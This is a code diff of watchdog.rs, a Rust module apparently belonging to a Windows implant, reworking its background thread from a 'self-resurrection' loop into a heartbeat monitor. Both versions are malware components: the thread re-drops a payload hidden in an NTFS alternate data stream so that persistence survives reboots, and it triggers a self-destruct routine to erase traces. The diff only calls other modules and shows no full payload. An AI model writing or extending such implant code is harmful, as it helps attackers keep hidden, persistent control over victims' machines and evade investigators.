@@ -1,34 +1,37 @@
-//! watchdog.rs — Self-resurrection watchdog thread
+//! watchdog.rs — heartbeat monitor
 //!
-//! Spawns a background thread that periodically checks whether the implant
-//! process is still alive (or whether persistence needs re-seeding).
-//! If the guardian flags a kill condition, hands off to full_destruct().
+//! A background thread checks a shared atomic every N seconds.
+//! If the beacon misses too many beats the implant calls full_destruct().
 
-#![allow(dead_code, non_snake_case)]
+#![allow(dead_code)]
 
+use core::sync::atomic::{AtomicU32, Ordering};
 use winapi::um::synchapi::Sleep;
 
-/// Interval between watchdog heartbeat checks (milliseconds).
-const WATCHDOG_INTERVAL_MS: u32 = 60_000; // 1 minute
+static HEARTBEAT: AtomicU32 = AtomicU32::new(0);
 
-/// Background watchdog loop — never returns.
-///
-/// Behaviour:
-///   1. Sleep for WATCHDOG_INTERVAL_MS.
-///   2. Re-drop ADS payload so persistence survives a reboot.
-///   3. If guardian signals shutdown, call full_destruct() and exit.
-pub unsafe fn run(sleep_key: &[u8; 16]) -> ! {
+pub fn kick() {
+    HEARTBEAT.fetch_add(1, Ordering::Relaxed);
+}
+
+/// Spawn the watchdog loop. `interval_ms` is how often to sample;
+/// `max_misses` is how many consecutive flat heartbeats trigger destruct.
+pub unsafe fn start(interval_ms: u32, max_misses: u32) {
+    let mut last   = HEARTBEAT.load(Ordering::Relaxed);
+    let mut misses = 0u32;
     loop {
-        Sleep(WATCHDOG_INTERVAL_MS);
-
-        // Re-seed ADS persistence so the payload survives reboots.
-        crate::resurrect::drop_from_ads();
-
-        // Check guardian kill flag.
-        if crate::guardian::should_terminate() {
-            crate::selfdestruct::full_destruct();
+        Sleep(interval_ms);
+        let now = HEARTBEAT.load(Ordering::Relaxed);
+        if now == last {
+            misses += 1;
+            if misses >= max_misses {
+                crate::resurrect::drop_from_ads();
+                crate::selfdestruct::full_destruct();
+                // full_destruct() does not return
+            }
+        } else {
+            misses = 0;
         }
-
-        let _ = sleep_key; // used by caller for obfuscated sleep
+        last = now;
     }
 }
